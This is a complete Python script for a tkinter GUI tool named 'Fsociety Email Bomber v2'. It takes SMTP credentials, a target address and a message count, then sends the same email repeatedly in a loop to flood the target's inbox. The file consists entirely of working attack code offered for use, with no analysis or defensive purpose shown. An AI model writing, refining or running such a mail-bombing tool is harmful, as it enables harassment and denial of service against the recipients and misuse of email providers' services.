import sys
import smtplib
import threading
from email.mime.text import MIMEText
import tkinter as tk
from tkinter import messagebox, scrolledtext

class EmailBomberGUI:
    def __init__(self, master):
        self.master = master
        master.title("Fsociety Email Bomber v2")
        master.geometry("600x500")

        self.create_widgets()

    def create_widgets(self):
        self.smtp_server_label = tk.Label(text="SMTP Server (e.g. smtp.gmail.com):")
        self.smtp_server_label.pack()
        self.smtp_server_entry = tk.Entry(width=50)
        self.smtp_server_entry.pack()

        self.smtp_port_label = tk.Label(text="SMTP Port:")
        self.smtp_port_label.pack()
        self.smtp_port_entry = tk.Entry(width=50)
        self.smtp_port_entry.insert(0, "587")
        self.smtp_port_entry.pack()

        self.email_label = tk.Label(text="Your Email:")
        self.email_label.pack()
        self.email_entry = tk.Entry(width=50)
        self.email_entry.pack()

        self.password_label = tk.Label(text="Your App Password:")
        self.password_label.pack()
        self.password_entry = tk.Entry(show="*", width=50)
        self.password_entry.pack()

        self.target_label = tk.Label(text="Target Email:")
        self.target_label.pack()
        self.target_entry = tk.Entry(width=50)
        self.target_entry.pack()

        self.subject_label = tk.Label(text="Subject:")
        self.subject_label.pack()
        self.subject_entry = tk.Entry(width=50)
        self.subject_entry.pack()

        self.message_label = tk.Label(text="Message:")
        self.message_label.pack()
        self.message_text = scrolledtext.ScrolledText(width=60, height=10)
        self.message_text.pack()

        self.count_label = tk.Label(text="Number of Emails to Send:")
        self.count_label.pack()
        self.count_entry = tk.Entry(width=50)
        self.count_entry.pack()

        self.send_button = tk.Button(text="Send Emails", command=self.start_attack)
        self.send_button.pack(pady=10)

    def start_attack(self):
        try:
            smtp_server = self.smtp_server_entry.get()
            smtp_port = int(self.smtp_port_entry.get())
            user_email = self.email_entry.get()
            password = self.password_entry.get()
            target_email = self.target_entry.get()
            subject = self.subject_entry.get()
            message = self.message_text.get("1.0", tk.END)
            count = int(self.count_entry.get())

            thread = threading.Thread(target=self.send_emails, args=(
                smtp_server, smtp_port, user_email, password, target_email,
                subject, message, count
            ))
            thread.start()

        except Exception as e:
            self.show_message("Input Error", str(e))

    def send_emails(self, smtp_server, smtp_port, user_email, password, target_email, subject, message, count):
        try:
            server = smtplib.SMTP(smtp_server, smtp_port)
            server.starttls()
            server.login(user_email, password)

            for _ in range(count):
                msg = MIMEText(message)
                msg['Subject'] = subject
                msg['From'] = user_email
                msg['To'] = target_email

                server.sendmail(user_email, target_email, msg.as_string())

            server.quit()
            self.show_message("Success", f"{count} emails sent successfully.")

        except Exception as e:
            self.show_message("Error", str(e))

    def show_message(self, title, message):
        messagebox.showinfo(title, message)

if __name__ == '__main__':
    root = tk.Tk()
    app = EmailBomberGUI(root)
    root.mainloop()
